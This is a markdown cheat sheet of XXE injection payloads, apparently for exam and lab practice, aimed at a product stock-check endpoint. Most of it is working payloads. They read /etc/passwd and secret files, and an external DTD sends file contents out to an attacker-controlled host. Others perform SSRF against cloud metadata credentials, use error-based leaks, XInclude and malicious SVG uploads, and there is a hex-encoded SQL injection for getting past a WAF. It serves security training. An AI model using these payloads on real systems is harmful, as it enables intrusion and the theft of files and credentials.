# XXE (XML External Entity) Injection - Stage 3

## 🎯 Target Location

**Primary Target:** Product Stock Check (`/product/stock`) ⭐⭐⭐

## 🔍 Detection

**IMPORTANT:** Scan the ENTIRE request, not just targeted scan!

### Stock Check Request Examples

**Type 1: Standard XML**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Type 2: SOAP Format**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <stockCheck>
      <productId>1</productId>
      <storeId>1</storeId>
    </stockCheck>
  </soap:Body>
</soap:Envelope>
```

## 🔥 Basic XXE Payloads

### File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Read Target File
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

## 🛡️ Advanced XXE Techniques

### Blind XXE with Out-of-Band Interaction
**Scenario:** No output visible, use Burp Collaborator

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://burp.oastify.com"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### Blind XXE with Parameter Entities
**Scenario:** Regular entities blocked

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://burp.oastify.com"> %xxe; ]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### Blind XXE Data Exfiltration via External DTD
**Scenario:** Exfiltrate file contents via out-of-band

**Step 1:** Host malicious DTD on exploit server (`/exploit.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://burp.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**Step 2:** Trigger from XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://exploit-server.com/exploit.dtd"> %xxe;]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### Blind XXE via Error Messages
**Scenario:** Error messages reveal file contents

**Step 1:** Host malicious DTD (`/exploit.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Step 2:** Trigger:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://exploit-server.com/exploit.dtd"> %xxe;]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

Error message will contain file contents.

---

### XInclude Attack
**Scenario:** Can't modify DOCTYPE (only control data)

```xml
<stockCheck>
  <productId xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///home/carlos/secret"/>
  </productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### XXE via File Upload
**Scenario:** Image upload processes SVG

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

---

### XXE via Modified Content-Type
**Scenario:** JSON/form data endpoint also accepts XML

**Original:**
```http
POST /action HTTP/1.1
Content-Type: application/x-www-form-urlencoded

foo=bar
```

**Modified:**
```http
POST /action HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
<root>
  <foo>&xxe;</foo>
</root>
```

## 🛠️ Tools & Extensions

### Hackvertor (Burp Extension)
**Use for XML encoding to bypass WAF:**

```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

## 🎓 Exam Tips

1. **Scan entire stock check request** - Not just targeted scan
2. **Use Burp Scanner** - Detects XXE automatically
3. **Adapt Burp's payload** - Scanner gives you starting point
4. **Use HackTricks** - Comprehensive XXE payloads
5. **Try both request types** - Standard XML and SOAP
6. **Use Hackvertor for encoding** - Bypass WAF filters
7. **Check file upload** - SVG files can contain XXE

## 🔍 Testing Workflow

### Step 1: Detect XXE
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://burp.oastify.com"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Step 2: Read File
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Step 3: Read Target
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

## 📚 Lab Examples

### Lab 1: Exploiting XXE to Retrieve Files
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

### Lab 2: Exploiting XXE to Perform SSRF
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```

### Lab 3: Blind XXE with Out-of-Band Interaction
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://burp.oastify.com"> %xxe; ]>
```

### Lab 4: Blind XXE to Exfiltrate Data
Use external DTD technique (see above).

### Lab 5: Blind XXE via Error Messages
Use error-based technique (see above).

### Lab 6: XInclude Attack
```xml
<productId xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</productId>
```

### Lab 7: XXE via Image File Upload
Upload malicious SVG (see above).

## 🔗 Quick Reference

| Attack Type | Use Case |
|-------------|----------|
| Basic XXE | Direct file read with output |
| Blind XXE (OOB) | No output, use Burp Collaborator |
| External DTD | Data exfiltration via OOB |
| Error-based | File contents in error messages |
| XInclude | Can't modify DOCTYPE |
| File upload | SVG/XML file upload |

## 📚 References

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [HackTricks XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [Hackvertor Extension](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)
